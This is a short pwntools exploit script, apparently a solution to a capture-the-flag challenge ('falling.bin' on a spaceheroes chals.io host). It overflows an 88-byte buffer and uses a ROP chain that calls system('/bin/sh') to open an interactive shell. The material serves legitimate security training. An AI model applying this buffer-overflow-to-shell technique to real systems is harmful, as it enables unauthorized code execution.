from pwn import *

exe = ELF('./falling.bin')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *vuln+91
        continue
    """)
elif args.REMOTE:
    io = remote("spaceheroes-falling-in-rop.chals.io", 443, ssl=True, sni="spaceheroes-falling-in-rop.chals.io")

offset = 88
rop = ROP(exe)
call_system = 0x4012a1
bin_sh = 0x402135
rop.raw(b'a' * offset)
rop.call(call_system, [bin_sh])
io.sendlineafter(b':', rop.chain())
io.interactive()
